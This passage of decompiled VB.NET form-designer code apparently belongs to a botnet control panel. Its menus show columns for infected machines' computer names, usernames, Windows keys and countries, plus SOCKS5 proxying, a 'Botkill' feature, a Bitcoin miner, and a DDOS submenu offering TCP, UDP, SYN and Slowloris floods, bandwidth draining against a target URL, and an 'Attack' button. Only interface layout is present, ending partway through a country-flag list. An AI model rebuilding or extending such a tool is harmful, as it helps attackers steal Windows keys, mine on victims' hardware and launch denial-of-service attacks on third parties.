            size = New Size(&H97, &H16)
            Me.VersionToolStripMenuItem.Size = size
            Me.VersionToolStripMenuItem.Text = "Version"
            Me.StatusToolStripMenuItem.Checked = True
            Me.StatusToolStripMenuItem.CheckState = CheckState.Checked
            Me.StatusToolStripMenuItem.Name = "StatusToolStripMenuItem"
            size = New Size(&H97, &H16)
            Me.StatusToolStripMenuItem.Size = size
            Me.StatusToolStripMenuItem.Text = "Status"
            Me.ComputerNameToolStripMenuItem.Checked = True
            Me.ComputerNameToolStripMenuItem.CheckState = CheckState.Checked
            Me.ComputerNameToolStripMenuItem.ForeColor = Color.Black
            Me.ComputerNameToolStripMenuItem.Name = "ComputerNameToolStripMenuItem"
            size = New Size(&H97, &H16)
            Me.ComputerNameToolStripMenuItem.Size = size
            Me.ComputerNameToolStripMenuItem.Text = "Computer Name"
            Me.UsernameToolStripMenuItem.Checked = True
            Me.UsernameToolStripMenuItem.CheckState = CheckState.Checked
            Me.UsernameToolStripMenuItem.Name = "UsernameToolStripMenuItem"
            size = New Size(&H97, &H16)
            Me.UsernameToolStripMenuItem.Size = size
            Me.UsernameToolStripMenuItem.Text = "Username"
            Me.WindowsKeyToolStripMenuItem.Checked = True
            Me.WindowsKeyToolStripMenuItem.CheckState = CheckState.Checked
            Me.WindowsKeyToolStripMenuItem.Name = "WindowsKeyToolStripMenuItem"
            size = New Size(&H97, &H16)
            Me.WindowsKeyToolStripMenuItem.Size = size
            Me.WindowsKeyToolStripMenuItem.Text = "Windows Key"
            Me.OSToolStripMenuItem.Checked = True
            Me.OSToolStripMenuItem.CheckState = CheckState.Checked
            Me.OSToolStripMenuItem.Name = "OSToolStripMenuItem"
            size = New Size(&H97, &H16)
            Me.OSToolStripMenuItem.Size = size
            Me.OSToolStripMenuItem.Text = "OS"
            Me.CountryToolStripMenuItem.Checked = True
            Me.CountryToolStripMenuItem.CheckState = CheckState.Checked
            Me.CountryToolStripMenuItem.Name = "CountryToolStripMenuItem"
            size = New Size(&H97, &H16)
            Me.CountryToolStripMenuItem.Size = size
            Me.CountryToolStripMenuItem.Text = "Country"
            Me.PingToolStripMenuItem.Checked = True
            Me.PingToolStripMenuItem.CheckState = CheckState.Checked
            Me.PingToolStripMenuItem.Name = "PingToolStripMenuItem"
            size = New Size(&H97, &H16)
            Me.PingToolStripMenuItem.Size = size
            Me.PingToolStripMenuItem.Text = "Ping"
            Me.Sock5ToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.ToolStripTextBox7, Me.OkToolStripMenuItem6 })
            Me.Sock5ToolStripMenuItem.Image = Class5.smethod_68
            Me.Sock5ToolStripMenuItem.Name = "Sock5ToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.Sock5ToolStripMenuItem.Size = size
            Me.Sock5ToolStripMenuItem.Text = "Sock5"
            Me.ToolStripTextBox7.Font = New Font("Tahoma", 8.25!)
            Me.ToolStripTextBox7.Name = "ToolStripTextBox7"
            size = New Size(100, &H15)
            Me.ToolStripTextBox7.Size = size
            Me.ToolStripTextBox7.Text = "4000 (port)"
            Me.OkToolStripMenuItem6.Image = Class5.smethod_7
            Me.OkToolStripMenuItem6.Name = "OkToolStripMenuItem6"
            size = New Size(160, &H16)
            Me.OkToolStripMenuItem6.Size = size
            Me.OkToolStripMenuItem6.Text = ":: Ok ::"
            Me.TracerouteIPToolStripMenuItem.Image = DirectCast(manager.GetObject("TracerouteIPToolStripMenuItem.Image"), Image)
            Me.TracerouteIPToolStripMenuItem.Name = "TracerouteIPToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.TracerouteIPToolStripMenuItem.Size = size
            Me.TracerouteIPToolStripMenuItem.Text = "IP Tracer"
            Me.BotkillToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.StartToolStripMenuItem2, Me.StopToolStripMenuItem2 })
            Me.BotkillToolStripMenuItem.Image = Class5.smethod_77
            Me.BotkillToolStripMenuItem.Name = "BotkillToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.BotkillToolStripMenuItem.Size = size
            Me.BotkillToolStripMenuItem.Text = "Botkill"
            Me.StartToolStripMenuItem2.Image = Class5.smethod_7
            Me.StartToolStripMenuItem2.Name = "StartToolStripMenuItem2"
            size = New Size(&H61, &H16)
            Me.StartToolStripMenuItem2.Size = size
            Me.StartToolStripMenuItem2.Text = "Start"
            Me.StopToolStripMenuItem2.Image = Class5.smethod_6
            Me.StopToolStripMenuItem2.Name = "StopToolStripMenuItem2"
            size = New Size(&H61, &H16)
            Me.StopToolStripMenuItem2.Size = size
            Me.StopToolStripMenuItem2.Text = "Stop"
            Me.BitCoinMinerToolStripMenuItem.Image = Class5.smethod_23
            Me.BitCoinMinerToolStripMenuItem.Name = "BitCoinMinerToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.BitCoinMinerToolStripMenuItem.Size = size
            Me.BitCoinMinerToolStripMenuItem.Text = "BitCoin Miner"
            Me.DDOSToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.TCPToolStripMenuItem, Me.UDPToolStripMenuItem, Me.SUDPToolStripMenuItem, Me.SSYNToolStripMenuItem, Me.SlowlorisToolStripMenuItem, Me.EToolStripMenuItem, Me.GetIPToolStripMenuItem })
            Me.DDOSToolStripMenuItem.Image = DirectCast(manager.GetObject("DDOSToolStripMenuItem.Image"), Image)
            Me.DDOSToolStripMenuItem.Name = "DDOSToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.DDOSToolStripMenuItem.Size = size
            Me.DDOSToolStripMenuItem.Text = "DDOS"
            Me.TCPToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.StartToolStripMenuItem1, Me.StopToolStripMenuItem1 })
            Me.TCPToolStripMenuItem.Image = Class5.smethod_37
            Me.TCPToolStripMenuItem.Name = "TCPToolStripMenuItem"
            size = New Size(&H99, &H16)
            Me.TCPToolStripMenuItem.Size = size
            Me.TCPToolStripMenuItem.Text = "TCP"
            Me.StartToolStripMenuItem1.DropDownItems.AddRange(New ToolStripItem() { Me.ToolStripTextBox9, Me.ToolStripTextBox10, Me.ToolStripTextBox11, Me.AttackToolStripMenuItem })
            Me.StartToolStripMenuItem1.Image = Class5.smethod_36
            Me.StartToolStripMenuItem1.Name = "StartToolStripMenuItem1"
            size = New Size(110, &H16)
            Me.StartToolStripMenuItem1.Size = size
            Me.StartToolStripMenuItem1.Text = "Settings"
            Me.ToolStripTextBox9.Name = "ToolStripTextBox9"
            size = New Size(100, &H15)
            Me.ToolStripTextBox9.Size = size
            Me.ToolStripTextBox9.Text = "127.0.0.1"
            Me.ToolStripTextBox10.Name = "ToolStripTextBox10"
            size = New Size(100, &H15)
            Me.ToolStripTextBox10.Size = size
            Me.ToolStripTextBox10.Text = "80"
            Me.ToolStripTextBox11.Name = "ToolStripTextBox11"
            size = New Size(100, &H15)
            Me.ToolStripTextBox11.Size = size
            Me.ToolStripTextBox11.Text = "JASdhnskjabfu(&**Y132hrjnfjBIYFg932gjhFJKb3b8b"
            Me.AttackToolStripMenuItem.Image = Class5.smethod_7
            Me.AttackToolStripMenuItem.Name = "AttackToolStripMenuItem"
            size = New Size(160, &H16)
            Me.AttackToolStripMenuItem.Size = size
            Me.AttackToolStripMenuItem.Text = ":: Attack ::"
            Me.StopToolStripMenuItem1.Image = Class5.smethod_10
            Me.StopToolStripMenuItem1.Name = "StopToolStripMenuItem1"
            size = New Size(110, &H16)
            Me.StopToolStripMenuItem1.Size = size
            Me.StopToolStripMenuItem1.Text = "Stop"
            Me.UDPToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.StartToolStripMenuItem5, Me.StopToolStripMenuItem6 })
            Me.UDPToolStripMenuItem.Image = Class5.smethod_37
            Me.UDPToolStripMenuItem.Name = "UDPToolStripMenuItem"
            size = New Size(&H99, &H16)
            Me.UDPToolStripMenuItem.Size = size
            Me.UDPToolStripMenuItem.Text = "UDP"
            Me.StartToolStripMenuItem5.Image = Class5.smethod_7
            Me.StartToolStripMenuItem5.Name = "StartToolStripMenuItem5"
            size = New Size(&H61, &H16)
            Me.StartToolStripMenuItem5.Size = size
            Me.StartToolStripMenuItem5.Text = "Start"
            Me.StopToolStripMenuItem6.Image = Class5.smethod_10
            Me.StopToolStripMenuItem6.Name = "StopToolStripMenuItem6"
            size = New Size(&H61, &H16)
            Me.StopToolStripMenuItem6.Size = size
            Me.StopToolStripMenuItem6.Text = "Stop"
            Me.SUDPToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.ToolStripTextBox5, Me.ToolStripTextBox12, Me.OkToolStripMenuItem4 })
            Me.SUDPToolStripMenuItem.Image = Class5.smethod_37
            Me.SUDPToolStripMenuItem.Name = "SUDPToolStripMenuItem"
            size = New Size(&H99, &H16)
            Me.SUDPToolStripMenuItem.Size = size
            Me.SUDPToolStripMenuItem.Text = "SUDP"
            Me.ToolStripTextBox5.Font = New Font("Tahoma", 8.25!)
            Me.ToolStripTextBox5.Name = "ToolStripTextBox5"
            size = New Size(100, &H15)
            Me.ToolStripTextBox5.Size = size
            Me.ToolStripTextBox5.Text = "127.0.0.1"
            Me.ToolStripTextBox12.Name = "ToolStripTextBox12"
            size = New Size(100, &H15)
            Me.ToolStripTextBox12.Size = size
            Me.ToolStripTextBox12.Text = "80"
            Me.OkToolStripMenuItem4.Image = Class5.smethod_7
            Me.OkToolStripMenuItem4.Name = "OkToolStripMenuItem4"
            size = New Size(160, &H16)
            Me.OkToolStripMenuItem4.Size = size
            Me.OkToolStripMenuItem4.Text = ":: Start ::"
            Me.SSYNToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.StartToolStripMenuItem6, Me.StopToolStripMenuItem5 })
            Me.SSYNToolStripMenuItem.Image = Class5.smethod_37
            Me.SSYNToolStripMenuItem.Name = "SSYNToolStripMenuItem"
            size = New Size(&H99, &H16)
            Me.SSYNToolStripMenuItem.Size = size
            Me.SSYNToolStripMenuItem.Text = "SYN"
            Me.StartToolStripMenuItem6.Image = Class5.smethod_7
            Me.StartToolStripMenuItem6.Name = "StartToolStripMenuItem6"
            size = New Size(&H61, &H16)
            Me.StartToolStripMenuItem6.Size = size
            Me.StartToolStripMenuItem6.Text = "Start"
            Me.StopToolStripMenuItem5.Image = Class5.smethod_10
            Me.StopToolStripMenuItem5.Name = "StopToolStripMenuItem5"
            size = New Size(&H61, &H16)
            Me.StopToolStripMenuItem5.Size = size
            Me.StopToolStripMenuItem5.Text = "Stop"
            Me.SlowlorisToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.StartToolStripMenuItem4, Me.StopToolStripMenuItem4 })
            Me.SlowlorisToolStripMenuItem.Image = Class5.smethod_37
            Me.SlowlorisToolStripMenuItem.Name = "SlowlorisToolStripMenuItem"
            size = New Size(&H99, &H16)
            Me.SlowlorisToolStripMenuItem.Size = size
            Me.SlowlorisToolStripMenuItem.Text = "Slowloris"
            Me.StartToolStripMenuItem4.Image = Class5.smethod_7
            Me.StartToolStripMenuItem4.Name = "StartToolStripMenuItem4"
            size = New Size(&H61, &H16)
            Me.StartToolStripMenuItem4.Size = size
            Me.StartToolStripMenuItem4.Text = "Start"
            Me.StopToolStripMenuItem4.Image = Class5.smethod_10
            Me.StopToolStripMenuItem4.Name = "StopToolStripMenuItem4"
            size = New Size(&H61, &H16)
            Me.StopToolStripMenuItem4.Size = size
            Me.StopToolStripMenuItem4.Text = "Stop"
            Me.EToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.ToolStripTextBox8, Me.StartToolStripMenuItem })
            Me.EToolStripMenuItem.Image = Class5.smethod_37
            Me.EToolStripMenuItem.Name = "EToolStripMenuItem"
            size = New Size(&H99, &H16)
            Me.EToolStripMenuItem.Size = size
            Me.EToolStripMenuItem.Text = "Drain Bandwidth"
            Me.ToolStripTextBox8.Font = New Font("Tahoma", 8.25!)
            Me.ToolStripTextBox8.Name = "ToolStripTextBox8"
            size = New Size(100, &H15)
            Me.ToolStripTextBox8.Size = size
            Me.ToolStripTextBox8.Tag = ""
            Me.ToolStripTextBox8.Text = "http://www.target.com/file.exe"
            Me.StartToolStripMenuItem.Image = Class5.smethod_7
            Me.StartToolStripMenuItem.Name = "StartToolStripMenuItem"
            size = New Size(160, &H16)
            Me.StartToolStripMenuItem.Size = size
            Me.StartToolStripMenuItem.Text = ":: Start ::"
            Me.GetIPToolStripMenuItem.Image = Class5.smethod_5
            Me.GetIPToolStripMenuItem.Name = "GetIPToolStripMenuItem"
            size = New Size(&H99, &H16)
            Me.GetIPToolStripMenuItem.Size = size
            Me.GetIPToolStripMenuItem.Text = "Get IP"
            Me.ServerToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.RestartToolStripMenuItem1, Me.CloseToolStripMenuItem })
            Me.ServerToolStripMenuItem.Image = DirectCast(manager.GetObject("ServerToolStripMenuItem.Image"), Image)
            Me.ServerToolStripMenuItem.Name = "ServerToolStripMenuItem"
            size = New Size(&HCD, &H16)
            Me.ServerToolStripMenuItem.Size = size
            Me.ServerToolStripMenuItem.Text = "Server"
            Me.RestartToolStripMenuItem1.Image = DirectCast(manager.GetObject("RestartToolStripMenuItem1.Image"), Image)
            Me.RestartToolStripMenuItem1.Name = "RestartToolStripMenuItem1"
            size = New Size(&H6D, &H16)
            Me.RestartToolStripMenuItem1.Size = size
            Me.RestartToolStripMenuItem1.Text = "Restart"
            Me.CloseToolStripMenuItem.Image = Class5.smethod_10
            Me.CloseToolStripMenuItem.Name = "CloseToolStripMenuItem"
            size = New Size(&H6D, &H16)
            Me.CloseToolStripMenuItem.Size = size
            Me.CloseToolStripMenuItem.Text = "Close"
            Me.ImageList1.ImageStream = DirectCast(manager.GetObject("ImageList1.ImageStream"), ImageListStreamer)
            Me.ImageList1.TransparentColor = Color.Transparent
            Me.ImageList1.Images.SetKeyName(0, "Zimbabwe.png")
            Me.ImageList1.Images.SetKeyName(1, "Afghanistan.png")
            Me.ImageList1.Images.SetKeyName(2, "African Union.png")
            Me.ImageList1.Images.SetKeyName(3, "Albania.png")
            Me.ImageList1.Images.SetKeyName(4, "Algeria.png")
            Me.ImageList1.Images.SetKeyName(5, "American Samoa.png")
            Me.ImageList1.Images.SetKeyName(6, "Andorra.png")
            Me.ImageList1.Images.SetKeyName(7, "Angola.png")
            Me.ImageList1.Images.SetKeyName(8, "Anguilla.png")
            Me.ImageList1.Images.SetKeyName(9, "Antarctica.png")
            Me.ImageList1.Images.SetKeyName(10, "Antigua & Barbuda.png")
            Me.ImageList1.Images.SetKeyName(11, "Arab League.png")
            Me.ImageList1.Images.SetKeyName(12, "Argentina.png")
            Me.ImageList1.Images.SetKeyName(13, "Armenia.png")
            Me.ImageList1.Images.SetKeyName(14, "Aruba.png")
            Me.ImageList1.Images.SetKeyName(15, "ASEAN.png")
            Me.ImageList1.Images.SetKeyName(&H10, "Australia.png")
            Me.ImageList1.Images.SetKeyName(&H11, "Austria.png")
            Me.ImageList1.Images.SetKeyName(&H12, "Azerbaijan.png")
            Me.ImageList1.Images.SetKeyName(&H13, "Bahamas.png")
            Me.ImageList1.Images.SetKeyName(20, "Bahrain.png")
            Me.ImageList1.Images.SetKeyName(&H15, "Bangladesh.png")
            Me.ImageList1.Images.SetKeyName(&H16, "Barbados.png")
            Me.ImageList1.Images.SetKeyName(&H17, "Belarus.png")
            Me.ImageList1.Images.SetKeyName(&H18, "Belgium.png")
            Me.ImageList1.Images.SetKeyName(&H19, "Belize.png")
            Me.ImageList1.Images.SetKeyName(&H1A, "Benin.png")
            Me.ImageList1.Images.SetKeyName(&H1B, "Bermuda.png")
            Me.ImageList1.Images.SetKeyName(&H1C, "Bhutan.png")
            Me.ImageList1.Images.SetKeyName(&H1D, "Bolivia.png")
            Me.ImageList1.Images.SetKeyName(30, "Bosnia & Herzegovina.png")
            Me.ImageList1.Images.SetKeyName(&H1F, "Botswana.png")
            Me.ImageList1.Images.SetKeyName(&H20, "Brazil.png")
            Me.ImageList1.Images.SetKeyName(&H21, "Brunei.png")
            Me.ImageList1.Images.SetKeyName(&H22, "Bulgaria.png")
            Me.ImageList1.Images.SetKeyName(&H23, "Burkina Faso.png")
            Me.ImageList1.Images.SetKeyName(&H24, "Burundi.png")
            Me.ImageList1.Images.SetKeyName(&H25, "Cambodja.png")
            Me.ImageList1.Images.SetKeyName(&H26, "Cameroon.png")
            Me.ImageList1.Images.SetKeyName(&H27, "Canada.png")
            Me.ImageList1.Images.SetKeyName(40, "Cape Verde.png")
            Me.ImageList1.Images.SetKeyName(&H29, "CARICOM.png")
            Me.ImageList1.Images.SetKeyName(&H2A, "Cayman Islands.png")
            Me.ImageList1.Images.SetKeyName(&H2B, "Central African Republic.png")
            Me.ImageList1.Images.SetKeyName(&H2C, "Chad.png")
            Me.ImageList1.Images.SetKeyName(&H2D, "Chile.png")
            Me.ImageList1.Images.SetKeyName(&H2E, "China.png")
            Me.ImageList1.Images.SetKeyName(&H2F, "CIS.png")
            Me.ImageList1.Images.SetKeyName(&H30, "Colombia.png")
            Me.ImageList1.Images.SetKeyName(&H31, "Commonwealth.png")
            Me.ImageList1.Images.SetKeyName(50, "Comoros.png")
            Me.ImageList1.Images.SetKeyName(&H33, "Congo-Brazzaville.png")
            Me.ImageList1.Images.SetKeyName(&H34, "Congo-Kinshasa(Zaire).png")
            Me.ImageList1.Images.SetKeyName(&H35, "Cook Islands.png")
            Me.ImageList1.Images.SetKeyName(&H36, "Costa Rica.png")
            Me.ImageList1.Images.SetKeyName(&H37, "Cote d'Ivoire.png")
            Me.ImageList1.Images.SetKeyName(&H38, "Croatia.png")
            Me.ImageList1.Images.SetKeyName(&H39, "Cuba.png")
            Me.ImageList1.Images.SetKeyName(&H3A, "Cyprus.png")
            Me.ImageList1.Images.SetKeyName(&H3B, "Czech Republic.png")
            Me.ImageList1.Images.SetKeyName(60, "Denmark.png")
            Me.ImageList1.Images.SetKeyName(&H3D, "Djibouti.png")
            Me.ImageList1.Images.SetKeyName(&H3E, "Dominica.png")
            Me.ImageList1.Images.SetKeyName(&H3F, "Dominican Republic.png")
            Me.ImageList1.Images.SetKeyName(&H40, "Ecuador.png")
            Me.ImageList1.Images.SetKeyName(&H41, "Egypt.png")
            Me.ImageList1.Images.SetKeyName(&H42, "El Salvador.png")
            Me.ImageList1.Images.SetKeyName(&H43, "England.png")
            Me.ImageList1.Images.SetKeyName(&H44, "Equatorial Guinea.png")
            Me.ImageList1.Images.SetKeyName(&H45, "Eritrea.png")
            Me.ImageList1.Images.SetKeyName(70, "Estonia.png")
            Me.ImageList1.Images.SetKeyName(&H47, "Ethiopia.png")
            Me.ImageList1.Images.SetKeyName(&H48, "European Union.png")
            Me.ImageList1.Images.SetKeyName(&H49, "Faroes.png")
            Me.ImageList1.Images.SetKeyName(&H4A, "Fiji.png")
            Me.ImageList1.Images.SetKeyName(&H4B, "Finland.png")
            Me.ImageList1.Images.SetKeyName(&H4C, "France.png")
            Me.ImageList1.Images.SetKeyName(&H4D, "Gabon.png")
            Me.ImageList1.Images.SetKeyName(&H4E, "Gambia.png")
            Me.ImageList1.Images.SetKeyName(&H4F, "Georgia.png")
            Me.ImageList1.Images.SetKeyName(80, "Germany.png")
            Me.ImageList1.Images.SetKeyName(&H51, "Ghana.png")
            Me.ImageList1.Images.SetKeyName(&H52, "Gibraltar.png")
            Me.ImageList1.Images.SetKeyName(&H53, "Greece.png")
            Me.ImageList1.Images.SetKeyName(&H54, "Greenland.png")
            Me.ImageList1.Images.SetKeyName(&H55, "Grenada.png")
            Me.ImageList1.Images.SetKeyName(&H56, "Guadeloupe.png")
            Me.ImageList1.Images.SetKeyName(&H57, "Guademala.png")
            Me.ImageList1.Images.SetKeyName(&H58, "Guam.png")
            Me.ImageList1.Images.SetKeyName(&H59, "Guernsey.png")
            Me.ImageList1.Images.SetKeyName(90, "Guinea.png")
            Me.ImageList1.Images.SetKeyName(&H5B, "Guinea-Bissau.png")
            Me.ImageList1.Images.SetKeyName(&H5C, "Guyana.png")
            Me.ImageList1.Images.SetKeyName(&H5D, "Haiti.png")
            Me.ImageList1.Images.SetKeyName(&H5E, "Honduras.png")
            Me.ImageList1.Images.SetKeyName(&H5F, "Hong Kong.png")
            Me.ImageList1.Images.SetKeyName(&H60, "Hungary.png")
            Me.ImageList1.Images.SetKeyName(&H61, "Iceland.png")
            Me.ImageList1.Images.SetKeyName(&H62, "India.png")
            Me.ImageList1.Images.SetKeyName(&H63, "Indonesia.png")
            Me.ImageList1.Images.SetKeyName(100, "Iran.png")
            Me.ImageList1.Images.SetKeyName(&H65, "Iraq.png")
            Me.ImageList1.Images.SetKeyName(&H66, "Ireland.png")
            Me.ImageList1.Images.SetKeyName(&H67, "Islamic Conference.png")
            Me.ImageList1.Images.SetKeyName(&H68, "Isle of Man.png")
            Me.ImageList1.Images.SetKeyName(&H69, "Israel.png")
            Me.ImageList1.Images.SetKeyName(&H6A, "Italy.png")
            Me.ImageList1.Images.SetKeyName(&H6B, "Jamaica.png")
            Me.ImageList1.Images.SetKeyName(&H6C, "Japan.png")
            Me.ImageList1.Images.SetKeyName(&H6D, "Jersey.png")
            Me.ImageList1.Images.SetKeyName(110, "Jordan.png")
            Me.ImageList1.Images.SetKeyName(&H6F, "Kazakhstan.png")
            Me.ImageList1.Images.SetKeyName(&H70, "Kenya.png")
            Me.ImageList1.Images.SetKeyName(&H71, "Kiribati.png")
            Me.ImageList1.Images.SetKeyName(&H72, "Kosovo.png")
            Me.ImageList1.Images.SetKeyName(&H73, "Kuwait.png")
            Me.ImageList1.Images.SetKeyName(&H74, "Kyrgyzstan.png")
            Me.ImageList1.Images.SetKeyName(&H75, "Laos.png")
            Me.ImageList1.Images.SetKeyName(&H76, "Latvia.png")
            Me.ImageList1.Images.SetKeyName(&H77, "Lebanon.png")
            Me.ImageList1.Images.SetKeyName(120, "Lesotho.png")
            Me.ImageList1.Images.SetKeyName(&H79, "Liberia.png")
            Me.ImageList1.Images.SetKeyName(&H7A, "Libya.png")
            Me.ImageList1.Images.SetKeyName(&H7B, "Liechtenstein.png")
            Me.ImageList1.Images.SetKeyName(&H7C, "Lithuania.png")
            Me.ImageList1.Images.SetKeyName(&H7D, "Luxembourg.png")
            Me.ImageList1.Images.SetKeyName(&H7E, "Macao.png")
            Me.ImageList1.Images.SetKeyName(&H7F, "Macedonia.png")
            Me.ImageList1.Images.SetKeyName(&H80, "Madagascar.png")
            Me.ImageList1.Images.SetKeyName(&H81, "Malawi.png")
            Me.ImageList1.Images.SetKeyName(130, "Malaysia.png")
            Me.ImageList1.Images.SetKeyName(&H83, "Maldives.png")
            Me.ImageList1.Images.SetKeyName(&H84, "Mali.png")
            Me.ImageList1.Images.SetKeyName(&H85, "Malta.png")
            Me.ImageList1.Images.SetKeyName(&H86, "Marshall Islands.png")
            Me.ImageList1.Images.SetKeyName(&H87, "Martinique.png")
            Me.ImageList1.Images.SetKeyName(&H88, "Mauritania.png")
            Me.ImageList1.Images.SetKeyName(&H89, "Mauritius.png")
            Me.ImageList1.Images.SetKeyName(&H8A, "Mexico.png")
            Me.ImageList1.Images.SetKeyName(&H8B, "Micronesia.png")
            Me.ImageList1.Images.SetKeyName(140, "Moldova.png")
            Me.ImageList1.Images.SetKeyName(&H8D, "Monaco.png")
            Me.ImageList1.Images.SetKeyName(&H8E, "Mongolia.png")
            Me.ImageList1.Images.SetKeyName(&H8F, "Montenegro.png")
            Me.ImageList1.Images.SetKeyName(&H90, "Montserrat.png")
            Me.ImageList1.Images.SetKeyName(&H91, "Morocco.png")
            Me.ImageList1.Images.SetKeyName(&H92, "Mozambique.png")
            Me.ImageList1.Images.SetKeyName(&H93, "Myanmar(Burma).png")
            Me.ImageList1.Images.SetKeyName(&H94, "Namibia.png")
            Me.ImageList1.Images.SetKeyName(&H95, "NATO.png")
            Me.ImageList1.Images.SetKeyName(150, "Nauru.png")
            Me.ImageList1.Images.SetKeyName(&H97, "Nepal.png")
            Me.ImageList1.Images.SetKeyName(&H98, "Netherlands Antilles.png")
            Me.ImageList1.Images.SetKeyName(&H99, "Netherlands.png")
            Me.ImageList1.Images.SetKeyName(&H9A, "New Caledonia.png")
            Me.ImageList1.Images.SetKeyName(&H9B, "New Zealand.png")
            Me.ImageList1.Images.SetKeyName(&H9C, "Nicaragua.png")
            Me.ImageList1.Images.SetKeyName(&H9D, "Niger.png")
            Me.ImageList1.Images.SetKeyName(&H9E, "Nigeria.png")
            Me.ImageList1.Images.SetKeyName(&H9F, "North Korea.png")
            Me.ImageList1.Images.SetKeyName(160, "Northern Cyprus.png")
            Me.ImageList1.Images.SetKeyName(&HA1, "Northern Ireland.png")
            Me.ImageList1.Images.SetKeyName(&HA2, "Norway.png")
            Me.ImageList1.Images.SetKeyName(&HA3, "Olimpic Movement.png")
            Me.ImageList1.Images.SetKeyName(&HA4, "Oman.png")
            Me.ImageList1.Images.SetKeyName(&HA5, "OPEC.png")
            Me.ImageList1.Images.SetKeyName(&HA6, "Pakistan.png")
            Me.ImageList1.Images.SetKeyName(&HA7, "Palau.png")
            Me.ImageList1.Images.SetKeyName(&HA8, "Palestine.png")
            Me.ImageList1.Images.SetKeyName(&HA9, "Panama.png")
            Me.ImageList1.Images.SetKeyName(170, "Papua New Guinea.png")
            Me.ImageList1.Images.SetKeyName(&HAB, "Paraguay.png")
            Me.ImageList1.Images.SetKeyName(&HAC, "Peru.png")
            Me.ImageList1.Images.SetKeyName(&HAD, "Philippines.png")
            Me.ImageList1.Images.SetKeyName(&HAE, "Poland.png")
            Me.ImageList1.Images.SetKeyName(&HAF, "Portugal.png")
            Me.ImageList1.Images.SetKeyName(&HB0, "Puerto Rico.png")
            Me.ImageList1.Images.SetKeyName(&HB1, "Qatar.png")
            Me.ImageList1.Images.SetKeyName(&HB2, "Red Cross.png")
            Me.ImageList1.Images.SetKeyName(&HB3, "Reunion.png")
            Me.ImageList1.Images.SetKeyName(180, "Romania.png")
            Me.ImageList1.Images.SetKeyName(&HB5, "Russian Federation.png")
            Me.ImageList1.Images.SetKeyName(&HB6, "Rwanda.png")
            Me.ImageList1.Images.SetKeyName(&HB7, "Saint Lucia.png")
            Me.ImageList1.Images.SetKeyName(&HB8, "Samoa.png")
            Me.ImageList1.Images.SetKeyName(&HB9, "San Marino.png")
            Me.ImageList1.Images.SetKeyName(&HBA, "Sao Tome & Principe.png")
            Me.ImageList1.Images.SetKeyName(&HBB, "Saudi Arabia.png")
            Me.ImageList1.Images.SetKeyName(&HBC, "Scotland.png")
            Me.ImageList1.Images.SetKeyName(&HBD, "Senegal.png")
            Me.ImageList1.Images.SetKeyName(190, "Serbia.png")
            Me.ImageList1.Images.SetKeyName(&HBF, "Seyshelles.png")
            Me.ImageList1.Images.SetKeyName(&HC0, "Sierra Leone.png")
            Me.ImageList1.Images.SetKeyName(&HC1, "Singapore.png")
            Me.ImageList1.Images.SetKeyName(&HC2, "Slovakia.png")
            Me.ImageList1.Images.SetKeyName(&HC3, "Slovenia.png")
            Me.ImageList1.Images.SetKeyName(&HC4, "Solomon Islands.png")
            Me.ImageList1.Images.SetKeyName(&HC5, "Somalia.png")
            Me.ImageList1.Images.SetKeyName(&HC6, "Somaliland.png")
            Me.ImageList1.Images.SetKeyName(&HC7, "South Afriica.png")
            Me.ImageList1.Images.SetKeyName(200, "South Korea.png")
            Me.ImageList1.Images.SetKeyName(&HC9, "Spain.png")
            Me.ImageList1.Images.SetKeyName(&HCA, "Sri Lanka.png")
            Me.ImageList1.Images.SetKeyName(&HCB, "St Kitts & Nevis.png")
            Me.ImageList1.Images.SetKeyName(&HCC, "St Vincent & the Grenadines.png")
            Me.ImageList1.Images.SetKeyName(&HCD, "Sudan.png")
            Me.ImageList1.Images.SetKeyName(&HCE, "Suriname.png")
            Me.ImageList1.Images.SetKeyName(&HCF, "Swaziland.png")
            Me.ImageList1.Images.SetKeyName(&HD0, "Sweden.png")
            Me.ImageList1.Images.SetKeyName(&HD1, "Switzerland.png")
            Me.ImageList1.Images.SetKeyName(210, "Syria.png")
            Me.ImageList1.Images.SetKeyName(&HD3, "Tahiti(French Polinesia).png")
            Me.ImageList1.Images.SetKeyName(&HD4, "Taiwan.png")
            Me.ImageList1.Images.SetKeyName(&HD5, "Tajikistan.png")
            Me.ImageList1.Images.SetKeyName(&HD6, "Tanzania.png")
            Me.ImageList1.Images.SetKeyName(&HD7, "Thailand.png")
            Me.ImageList1.Images.SetKeyName(&HD8, "Timor-Leste.png")
            Me.ImageList1.Images.SetKeyName(&HD9, "Togo.png")
            Me.ImageList1.Images.SetKeyName(&HDA, "Tonga.png")
            Me.ImageList1.Images.SetKeyName(&HDB, "Trinidad & Tobago.png")
            Me.ImageList1.Images.SetKeyName(220, "Tunisia.png")
            Me.ImageList1.Images.SetKeyName(&HDD, "Turkey.png")
            Me.ImageList1.Images.SetKeyName(&HDE, "Turkmenistan.png")
            Me.ImageList1.Images.SetKeyName(&HDF, "Turks and Caicos Islands.png")
            Me.ImageList1.Images.SetKeyName(&HE0, "Tuvalu.png")
            Me.ImageList1.Images.SetKeyName(&HE1, "Uganda.png")
            Me.ImageList1.Images.SetKeyName(&HE2, "Ukraine.png")
            Me.ImageList1.Images.SetKeyName(&HE3, "United Arab Emirates.png")
            Me.ImageList1.Images.SetKeyName(&HE4, "United Kingdom(Great Britain).png")
            Me.ImageList1.Images.SetKeyName(&HE5, "United Nations.png")
            Me.ImageList1.Images.SetKeyName(230, "United States of America.png")
            Me.ImageList1.Images.SetKeyName(&HE7, "Uruguay.png")
            Me.ImageList1.Images.SetKeyName(&HE8, "Uzbekistan.png")
            Me.ImageList1.Images.SetKeyName(&HE9, "Vanutau.png")
            Me.ImageList1.Images.SetKeyName(&HEA, "Vatican City.png")
